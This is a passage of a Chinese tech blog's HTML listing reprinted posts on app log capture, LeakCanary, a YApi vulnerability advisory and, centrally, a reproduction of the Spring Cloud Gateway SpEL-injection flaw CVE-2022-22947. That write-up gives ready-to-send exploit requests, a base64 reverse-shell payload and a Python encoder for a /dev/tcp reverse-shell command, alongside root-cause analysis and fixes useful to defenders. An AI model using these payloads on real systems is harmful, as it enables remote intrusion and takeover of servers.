+<p>1.搜索关键字 anr in<br>2.treces.txt (adb shell–cd data – cd anr– traces.txt) （获取一次无响应）<br>3.dropbox.txt （adb shell – cd data – cd system – cd dropbox）（获取多次）</p>
+</blockquote>
+<h2><span id="一-mac-x2f-windows-电脑抓取android手机app-日志的方法">一、Mac &#x2F; Windows 电脑抓取Android手机APP 日志的方法</span></h2><h3><span id="电若脑只连接一个android设备">电若脑只连接一个Android设备</span></h3><blockquote>
+<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启–&gt;允许usb调试<br>3、查询手机上第三方apk包的包名：<br>打开控制台：cmd<br>查询包名：adb shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为 com.rokid.mobile<br>4、查询若琪app的进程号：adb shell ps | grep com.rokid.mobile （查出两个进程号）<br>5、电脑的当前路径创建文件存放日志：touch log<br>6、给文件操作权限：chmod 777 log<br>7、查询若琪APP的日志并导入到log文件：adb shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
+</blockquote>
+<h3><span id="电脑连接多个android设备">电脑连接多个Android设备：</span></h3><blockquote>
+<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启<br>3、cmd 打开控制台<br>4、adb devices查询设备号<br>5、查询第三方apk包的包名：adb -s 设备号 shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为com.rokid.mobile<br>6、查询第三方apk进程号：adb -s 设备号 shell ps | grep com.rokid.mobile<br>7、电脑的当前路径创建文件存放日志：touch log<br>8、给文件操作权限：chmod 777 log<br>9、查询若琪APP的日志并导入到log文件：adb -s 设备号 shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
+</blockquote>
+<h2><span id="二-mac电脑上抓取ios手机app日志的方法使用mac电脑自带的控制台">二、Mac电脑上抓取IOS手机APP日志的方法：使用Mac电脑自带的“控制台”</span></h2><blockquote>
+<p>Mac电脑对iOS手机的兼容性非常好，抓日志也很简单，ios手机连上电脑，打开控制台就开始抓取日志了，抓取的是全部的系统日志，用“RokidApp”过滤出若琪APP的日志<br><img src="/2023/10/25/Catch-AppLog/4.png" alt="image"> </p>
+<p><img src="/2023/10/25/Catch-AppLog/5.png" alt="image"> </p>
+</blockquote>
+<h2><span id="三-windows电脑上抓取ios-手机app日志的方法可以用itools工具">三、Windows电脑上抓取ios 手机APP日志的方法：可以用iTools工具</span></h2><blockquote>
+<p>1、下载安装itools工具：<a target="_blank" rel="noopener" href="http://www.mydown.com/soft/59/11963059.shtml">http://www.mydown.com/soft/59/11963059.shtml</a><br>2、插上ios手机之后要先安装驱动，驱动安装成功才能连上ios手机<br>3、如下图为连接手机成功<br><img src="/2023/10/25/Catch-AppLog/6.png" alt="image"> </p>
+<p>4、点击“工具箱”，点击“实时日志”，ios上所有APP的日志都能打印出来<br><img src="/2023/10/25/Catch-AppLog/7.png" alt="image"> </p>
+<p>5、保存系统日志,文件名为AppLog<br><img src="/2023/10/25/Catch-AppLog/8.png" alt="image"> </p>
+<p>6、cmd 打开控制台，过滤出若琪APP的日志并查看日志<br>cat AppLog | grep -e “RokidApp”<br>7、将若琪APP日志导出<br>创建文件：touch RokidAppLog<br>给文件赋权限：chmod 777 RokidAppLog<br>导出日志： cat AppLog | grep -e “RokidApp” &gt;&gt; RokidAppLog</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/AppLog/" rel="tag">AppLog</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/CVE-2022-22947-Spring-Cloud/">
+                Spring Cloud Gateway rce（CVE-2022-22947）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-cloud-gateway-rcecve-2022-22947">Spring Cloud Gateway rce（CVE-2022-22947）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123338198">6right</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。<br>也是codeql发现的</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>3.1.0<br>3.0.0至3.0.6<br>3.0.0之前的版本</p>
+</blockquote>
+<h2><span id="复现漏洞">复现漏洞</span></h2><blockquote>
+<p>首先，发送以下请求以添加包含恶意SpEL 表达式的路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反弹shell将命令替换为base64命令即可<br>Content-Type: application&#x2F;json</p>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>其次，刷新网关路由器。SpEL 表达式将在此步骤中执行：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>第三，发送以下请求以检索结果：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/3.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>查看所有路由</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span> 123.58.236.76:40279</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>最后，发送一个 DELETE 请求来删除我们的恶意路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/actuator/gateway/routes/lyy9</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:40279</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/5.png" alt="image"><br>删除后用记得也用refresh</p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">&#123;</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="string">\&quot;bash</span> -c &#123;echo,反弹shellbase64&#125;</span>|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).getInputStream()))&#125;&quot;</span></span></span><br><span class="line"><span class="language-livescript">    &#125;</span></span><br><span class="line"><span class="language-livescript">  &#125;],</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span></span></span><br><span class="line"><span class="language-livescript">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删去new String[]初始化，直接将base64的反弹shell命令放入填入<br>生成base64那个站点崩了，可以自己写个python</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64_str = <span class="built_in">input</span>(<span class="string">&quot;请输入反弹shell命令,如：bash -i  &gt;&amp;  /dev/tcp/11.11.11.11/2334 0&gt;&amp;1\n&quot;</span>)</span><br><span class="line">res = base64.b64encode(base64_str.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bash -c &#123;echo,&quot;</span>+res.decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行<br>如果想要深入学习SpEL表达式可以参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">Mi1k7ea师傅的文章</a></p>
+</blockquote>
+<blockquote>
+<p>首先定位到漏洞的修复版本对比<br><code>https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e</code><br><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/6.png" alt="image"><br>可以看到删除了默认的StandardEvaluationContext，改用自定义的GatewayEvaluationContext来对表达式进行SpEL进行处理</p>
+<p>默认的StandardEvaluationContext里getValue方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)</span> &#123;</span><br><span class="line">	Object value;</span><br><span class="line">	<span class="type">String</span> <span class="variable">rawValue</span> <span class="operator">=</span> entryValue;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span>) &#123;</span><br><span class="line">		rawValue = rawValue.trim();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span> &amp;&amp; rawValue.startsWith(<span class="string">&quot;#&#123;&quot;</span>) &amp;&amp; entryValue.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">		<span class="comment">// assume it&#x27;s spel</span></span><br><span class="line">		<span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">		context.setBeanResolver(<span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(beanFactory));</span><br><span class="line">		<span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(entryValue, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>());</span><br><span class="line">		value = expression.getValue(context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		value = entryValue;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以控制 getValue 方法调用,那么就能调用任何有效的表达式达到注入效果</p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>3.1.x用户应升级到3.1.1+<br>3.0.x用户应升级到3.0.7+<br>如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用<br>如果需要Actuator端点，则应使用Spring Security对其进行保护</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/Android-Leaks/">
+                android使用Leaks检测内存泄漏
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android使用leaks检测内存泄漏">android使用Leaks检测内存泄漏</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/fancy_xty/article/details/51595313">浅浅清风</a> 并作补充</p>
+</blockquote>
+<h2><span id="leaks-内存泄漏检测工具使用">Leaks 内存泄漏检测工具使用</span></h2><blockquote>
+<p>网址:<a target="_blank" rel="noopener" href="https://github.com/square/leakcanary">https://github.com/square/leakcanary</a><br>在你的module中添加依赖</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android:1.4-beta2&#x27;</span></span><br><span class="line">releaseCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br><span class="line">testCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Application中添加: <code>LeakCanary.install(this);</code></p>
+</blockquote>
+<blockquote>
+<p>并且确保你的app处于调试模式，如下图:</p>
+<p><img src="/2023/10/25/Android-Leaks/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>当切换到release版本的时候,leakcanary-debug不会被打包.所以切换到release之后不用对leakcanary做注释或者删除等操作.<br>现在就可以开始使用了,重新编译你的工程,运行在模拟器或真机上.<br>在各个页面中测试,如果存在内存泄漏的情况,leaks会弹出通知提醒你查看.<br>在leaks中会有详细的泄漏说明，如产生内存泄漏的大小，产生内存泄漏的页面和相关的信息。</p>
+<p><img src="/2023/10/25/Android-Leaks/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>内存泄漏详情：</p>
+<p><img src="/2023/10/25/Android-Leaks/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>最后有一些关于内存泄漏的建议:<br>为了避免上下文相关的内存泄漏,记住以下几点:<br>不要长期引用context-activity(引用一个活动应该有相同的生命周期活动本身)<br>使用getApplicationContext而不是context或activity试试<br>避免非静态内部类的一个活动如果你不控制自己的生命周期,使用静态内部类,让一个弱引用来传递,并且记住,垃圾收集器对于内存泄漏并不保险。</p>
+</blockquote>
+<blockquote>
+<p>下面说几个作者遇到的内存泄漏的情况以及解决方案:<br>使用百度地图LocationClient.在Activity被销毁时调用</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mLocClient != <span class="literal">null</span>)&#123;</span><br><span class="line">            mLocClient.unRegisterLocationListener(myListener);</span><br><span class="line">            mLocClient.stop();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用友盟分享登录时, 传递getApplicationContext<br>第三方库如果需要传入Activity的时候，传递一个弱引用进去， 可以避免内存泄漏,如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference&lt;HomeActivity&gt; reference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>(getActivity());</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ShareAction</span>(reference.get()).setDisplayList(displaylist);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Handler中容易造成内存泄漏，最好使用弱引用方式，要么，在Activity销毁的时候清空所有的handler栈。</p>
+<p>在使用WebView的时候也可能出现内存泄漏，解决办法，我的<a target="_blank" rel="noopener" href="http://blog.csdn.net/fancy_xty/article/details/51595697">另一篇博客</a>里有详细讲解。</p>
+<p>在使用RxJava的时候也可能会出现内存泄漏，可以使用RxLifecycler来解决。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Leaks/" rel="tag">Leaks</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/MPS-2022-60494-YApi/">
+                YApi命令执行漏洞（MPS-2022-60494）安全风险通告
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="yapi命令执行漏洞mps-2022-60494安全风险通告">YApi命令执行漏洞（MPS-2022-60494）安全风险通告</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/48900">奇安信 CERT</a> 并作补充</p>
+</blockquote>
+<h2><span id="项目介绍">项目介绍</span></h2><blockquote>
+<p>YApi 是高效、易用、功能强大的 API管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护API。<br>近日，奇安信CERT监测到YApi命令执行漏洞，远程未授权的攻击者可通过注入漏洞获取有效用户token，进而利用自动化测试接口绕过沙箱限制，最终在目标系统上执行任意命令。鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护。</p>
+</blockquote>
+<h2><span id="漏洞概述">漏洞概述</span></h2><blockquote>
+<p>YApi中存在命令执行漏洞，远程未授权的攻击者可通过注入漏洞获取有效用户token，进而利用自动化测试接口绕过沙箱限制，最终在目标系统上执行任意命令。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>YApi &lt; 1.12.0</p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><h3><span id="一-版本升级">一、版本升级</span></h3><blockquote>
+<p>目前官方已有<a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/releases/tag/v1.12.0">可更新版本</a>，建议受影响用户更新至 1.12.0 及以上版本。<br>注：</p>
+<ol>
+<li>YApi 1.11.0版本已修复Mongo注入获取Token的问题，导致攻击者无法在未授权的情况下利用此漏洞。</li>
+<li>在YApi 1.12.0的版本更新中，仅默认禁用了Pre-request和Pre-response脚本功能，使得此漏洞在默认配置下无法利用。</li>
+</ol>
+</blockquote>
+<h3><span id="二-缓解措施">二、缓解措施</span></h3><blockquote>
+<ol>
+<li>在业务允许的情况下，建议将YApi部署在内网，禁止外网访问。</li>
+<li>修改默认token加密的盐:<br>编辑项目根目录中的config.json，添加”passsalt”:”任意随机值”，如:<br><code>&quot;passsalt&quot;:&quot;this_is_a_test&quot;</code><br>保存，重启YApi服务即可。</li>
+</ol>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c?diff=split">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c?diff=split</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/YApi/" rel="tag">YApi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/">
+                CVE-2022-31692 Spring Security Oauth2 Client权限提升漏洞
